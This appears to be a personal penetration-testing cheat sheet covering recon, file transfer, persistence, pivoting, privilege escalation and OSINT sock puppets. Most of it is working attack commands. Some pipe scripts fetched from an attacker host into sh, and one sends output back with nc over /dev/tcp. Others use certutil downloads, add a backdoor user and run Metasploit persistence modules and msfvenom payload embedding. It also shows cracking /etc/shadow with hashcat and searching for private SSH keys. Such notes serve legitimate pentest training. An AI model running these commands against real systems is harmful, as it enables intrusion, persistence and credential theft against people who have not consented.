## Permissions

virtual host routing

dnsrecon for finding domains

```
dnsrecon -r 127.0.0.1/24 -n <ip> -d <make up a domain>
```


## File Transfer
HTTP 
```
sudo python3 -m http.server 80 #Host
curl 10.10.10.10/linpeas.sh | sh #Victim
```
FTP
```
python -m pyftpdlib 21 #Host
ftp <ip> #Victim
```
**Windows**
Certutil
```
certutil.exe -urlcache -f http://<attack IP>/<file> <file name>
```
**Linux**
```
wget
```
## Persistance
*Probably already with a meterpreter shell*

**Scripts**
```
run persistance -h
exploit/windows/local/persistance
exploit/windows/local/registry_persistance
```
**Scheduled Task**
```
run scheduleme
run scheduletaskabuse
```
**Add User**
```
net user <user> <pass> /add
```
**MSFVenom**
```
msfvenom -a <arch> --platform <os> -x <name>.<ext> -k -p windows/messagebox lhost=<ip> -b "\x00" -f exe -o <final_name>.<ext>
```
## Pivoting

SSH proxy through a compromised machine
```
ssh  -f -N -D <Proxy Port> -i pivot <root user>@<proxy ip> 
```
Then run "proxychains" before commands you want to proxy like
```
proxychains nmap -sV <target ip>
```
Other tools that can be used are [sshuttle](https://github.com/sshuttle/sshuttle?tab=readme-ov-file) and [chisel](https://github.com/jpillora/chisel)
```
sshuttle -r <root>@<proxy ip> <new network>/<CIDR> --ssh-cmd "ssh -i proxy"
```

## Linux Privilege Escalation 
Identify Weakness
Wanna find bad SUID permissions?
```
find / -type f -perm -4000 2>/dev/null 
```
GTFOBins
```
/home/user/tools/linux-exploit-suggester/linux-exploit-suggester.sh
```
```
cat ~/.bash_history | grep -i passwd
ls -la /etc/shadow
unshadow <PASSWORD-FILE> <SHADOW-FILE> > unshadowed.txt
hashcat -m 1800 unshadowed.txt rockyou.txt -O
```

```
find / -name authorized_keys 2> /dev/null
find / -name id_rsa 2> /dev/null 
```

Always go for a tty shell if you have a worse shell if possible

use a command like [(see here)](https://wiki.zacheller.dev/pentest/privilege-escalation/spawning-a-tty-shell)
```
python -c 'import pty; pty.spawn("/bin/sh")'
```

## Windows Privilege Escalation
to grab a file to a windows computer 

```
certutil.exe -urlcache -f http://<lhost>/<filename> <name>
```
## Useful files

[PEASS-NG](https://github.com/peass-ng/PEASS-ng)

```
# From public github
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Local network
sudo python3 -m http.server 80 #Host
curl 10.10.10.10/linpeas.sh | sh #Victim

# Without curl
sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
cat < /dev/tcp/10.10.10.10/80 | sh #Victim

# Excute from memory and send output back to the host
nc -lvnp 9002 | tee linpeas.out #Host
curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002 #Victim

# Use a linpeas binary
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_linux_amd64
chmod +x linpeas_linux_amd64
./linpeas_linux_amd64
```

### Sock Puppets

Creating an Effective Sock Puppet for OSINT Investigations – Introduction - [https://web.archive.org/web/20210125191016/https://jakecreps.com/2018/11/02/sock-puppets/](https://web.archive.org/web/20210125191016/https://jakecreps.com/2018/11/02/sock-puppets)

The Art Of The Sock - [https://www.secjuice.com/the-art-of-the-sock-osint-humint/](https://www.secjuice.com/the-art-of-the-sock-osint-humint/)

Reddit - My process for setting up anonymous sockpuppet accounts - [https://www.reddit.com/r/OSINT/comments/dp70jr/my_process_for_setting_up_anonymous_sockpuppet/](https://www.reddit.com/r/OSINT/comments/dp70jr/my_process_for_setting_up_anonymous_sockpuppet/)

Fake Name Generator - [https://www.fakenamegenerator.com/](https://www.fakenamegenerator.com/)

This Person Does not Exist - [https://www.thispersondoesnotexist.com/](https://www.thispersondoesnotexist.com/)

Privacy.com - [https://privacy.com/join/LADFC](https://privacy.com/join/LADFC) - *Referral link. We each get $5 credit on sign up.

### Search Engine Operators
```
site:<url>
```
```
"<text>"
```
```
AND
```
```
filetype:<ext>
```
```
-<not text>
```
```
intext:<string>
```
Google Advanced Search


## MISC
In BurpSuite you can "Limit Scope" in proxy settings to allow use of accessing other pages while burp is on
![[../Pasted image 20250508181510.png]]
